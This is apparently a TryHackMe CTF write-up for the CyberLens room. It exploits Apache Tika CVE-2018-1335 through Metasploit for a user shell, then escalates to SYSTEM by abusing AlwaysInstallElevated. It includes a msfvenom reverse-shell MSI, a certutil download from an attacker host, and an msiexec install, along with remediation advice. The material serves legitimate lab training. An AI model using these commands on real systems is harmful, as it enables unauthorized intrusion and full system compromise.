# CyberLens — TryHackMe Writeup

> **Room:** [CyberLens](https://tryhackme.com/room/cyberlens) · **Difficulty:** Easy–Medium
> **Category:** Web / Windows (Apache Tika RCE → AlwaysInstallElevated)
> **Author of writeup:** 0xnyx
> **Goal:** Exploit the CyberLens web server and escalate to SYSTEM.

> ⚠️ In line with TryHackMe's write-up policy, **no flag values are included** — only the method, so you can reproduce every step yourself.

---

## How to read this writeup

Each step is **Do** (the command/action) → **You get** (what comes back) → **Why / what next** (what it means and where it leads). The chain is: find Apache Tika → CVE-2018-1335 RCE → user shell → AlwaysInstallElevated → SYSTEM.

---

## Step 1 — Port scan

**Do** — Scan ALL ports (the key service is on a high port), then version-scan the interesting ones. Add the vhost to hosts first (the room tells you to).

```bash
echo "<TARGET> cyberlens.thm" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 5000 -T4 -Pn <TARGET>
nmap -sVC -p 80,61777 -Pn <TARGET>
```

**You get**

```
80/tcp    open  http   Apache httpd 2.4.57 (Win64)
135,139,445            (Windows SMB)
3389/tcp               RDP
5985,47001             WinRM
61777/tcp open  http   Jetty 8.y.z-SNAPSHOT     <-- unusual high port
```

**Why / what next** — It's a **Windows** box. The standout is **port 61777 running Jetty** — not a normal web server. Metadata/forensics themed rooms + a Jetty server on a high port screams **Apache Tika Server**. Confirm the version:

```bash
curl -s http://cyberlens.thm:61777/version
# Apache Tika 1.17
```

Tika **1.17** is vulnerable to **CVE-2018-1335** (command injection, affects 1.7–1.18).

---

## Step 2 — Foothold: CVE-2018-1335 (Tika command injection)

**Do** — Tika Server's OCR feature lets a client set the Tesseract binary path/args via HTTP headers (`X-Tika-OCRTesseractPath` / `X-Tika-OCRLanguage`) on a `PUT /meta` request. Those values are concatenated into a command line with no sanitisation → arbitrary command execution. The reliable exploit is the Metasploit module, which PUTs a crafted JP2 image and injects a jscript payload.

```bash
msfconsole -q
```
```
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS cyberlens.thm
set RPORT 61777
set LHOST <ATTACKER>
set LPORT 4444
set FORCEEXPLOIT true
run
```

**You get** — A Meterpreter session as `cyberlens\cyberlens`.

```
getuid        # cyberlens\cyberlens
shell
whoami        # cyberlens\cyberlens
```

**Why / what next** — We have a shell as a normal user. Grab the user flag, then enumerate privesc.

```cmd
dir /s /b C:\Users\CyberLens\Desktop\user.txt
type C:\Users\CyberLens\Desktop\user.txt      # <USER FLAG>
```

---

## Step 3 — Privilege-escalation enumeration

**Do** — Check privileges and the common Windows misconfigs.

```cmd
whoami /priv
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**You get**

```
whoami /priv  -> only SeChangeNotify / SeIncreaseWorkingSet  (NO SeImpersonate)
HKCU ... AlwaysInstallElevated    REG_DWORD    0x1
HKLM ... AlwaysInstallElevated    REG_DWORD    0x1
```

**Why / what next** — There's **no `SeImpersonatePrivilege`**, so PrintSpoofer / Potato attacks are out. But **`AlwaysInstallElevated` is `0x1` in BOTH `HKCU` and `HKLM`** — this policy makes Windows install **any** `.msi` package with **SYSTEM** privileges, regardless of who runs it. That's a direct path to SYSTEM.

---

## Step 4 — Privilege escalation: AlwaysInstallElevated

**Do** — Build a malicious MSI that calls back a shell, host it, and run it with `msiexec` on the target.

```bash
# on Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=5555 -f msi -o evil.msi
python3 -m http.server 8000
# separate terminal:
nc -lvnp 5555
```

```cmd
:: on the target (user shell):
certutil -urlcache -f http://<ATTACKER>:8000/evil.msi C:\Windows\Temp\evil.msi
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

**You get** — A new shell on your listener running as **`nt authority\system`**.

**Why / what next** — Because `AlwaysInstallElevated` forces the MSI to install as SYSTEM, our payload inside it runs as SYSTEM. Read the admin flag (search for it — the filename varies):

```cmd
whoami                                         # nt authority\system
dir /s /b C:\Users\Administrator\*.txt
type C:\Users\Administrator\Desktop\admin.txt  # <ADMIN FLAG>
```

**You get** — The admin flag. Box fully owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap -p- + `/version` | Apache Tika 1.17 on :61777 |
| 2 | CVE-2018-1335 (Tika header injection) | Shell as cyberlens (user flag) |
| 3 | `whoami /priv` + reg query | AlwaysInstallElevated = 0x1 (both hives) |
| 4 | Malicious MSI + `msiexec` | SYSTEM (admin flag) |

## Lessons

- A metadata/forensics service on an odd high port (Jetty) → check for **Apache Tika**; `/version` confirms it. Tika **1.7–1.18** = **CVE-2018-1335** command injection.
- No `SeImpersonatePrivilege`? Don't stop — check **`AlwaysInstallElevated`**. Both `HKCU` **and** `HKLM` set to `0x1` = any MSI runs as SYSTEM.
- Privesc MSI: `msfvenom -f msi` → deliver with `certutil -urlcache -f` (a Windows LOLBIN) → `msiexec /quiet /qn /i`.
- Core Windows privesc checklist: `whoami /priv`, `AlwaysInstallElevated`, `cmdkey /list`, Winlogon autologon creds, unquoted service paths.

## Remediation

- Patch/upgrade Apache Tika (≥ 1.19) and don't expose the Tika server to untrusted clients.
- Never enable `AlwaysInstallElevated` — it is a direct local-privilege-escalation policy.
- Run forensic/parsing services as a low-privilege, sandboxed account.

---

*Write-up for [TryHackMe — CyberLens](https://tryhackme.com/room/cyberlens).*
